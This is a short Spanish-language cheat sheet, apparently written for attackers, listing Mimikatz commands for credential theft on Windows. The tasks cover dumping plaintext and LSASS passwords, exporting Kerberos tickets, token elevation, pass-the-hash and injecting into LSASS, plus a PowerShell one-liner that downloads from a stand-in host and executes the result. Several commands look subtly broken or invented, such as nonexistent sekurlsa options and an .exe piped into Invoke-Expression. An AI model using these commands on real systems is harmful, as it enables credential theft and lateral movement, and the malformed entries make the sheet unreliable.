

| Tarea                                          | Comando                                                      |
|------------------------------------------------|--------------------------------------------------------------|
| Extracción de Credenciales en Texto Plano      | `mimikatz.exe "sekurlsa::logonpasswords"`                   |
| Extracción de Credenciales de LSASS            | `mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords"` |
| Extracción de Credenciales de Kerberos         | `mimikatz.exe "sekurlsa::tickets /export"`                 |
| Manipulación de Tokens                         | `mimikatz.exe "token::elevate"`                            |
| Dump de Credenciales de Procesos Específicos   | `mimikatz.exe "sekurlsa::process /name:lsass.exe" "sekurlsa::logonpasswords"` |
| Inyectar Credenciales en otro Proceso          | `mimikatz.exe "sekurlsa::pth /user:username /domain:domain /ntlm:NTLMhash /run:command"` |
| Mostrar Información sobre Credenciales en Hash | `mimikatz.exe "sekurlsa::tickets /export" "sekurlsa::crypto"` |
| Inyectar Mimikatz en LSASS                    | `mimikatz.exe "misc::memssp"`                              |
| Escuchar Contraseñas de Forma Continua         | `mimikatz.exe "sekurlsa::eventlog /unkeyed"`              |
| Descargar y Ejecutar Mimikatz Remotamente     | `powershell -c "(New-Object Net.WebClient).DownloadString('http://example.com/mimikatz.exe') | Invoke-Expression"` |
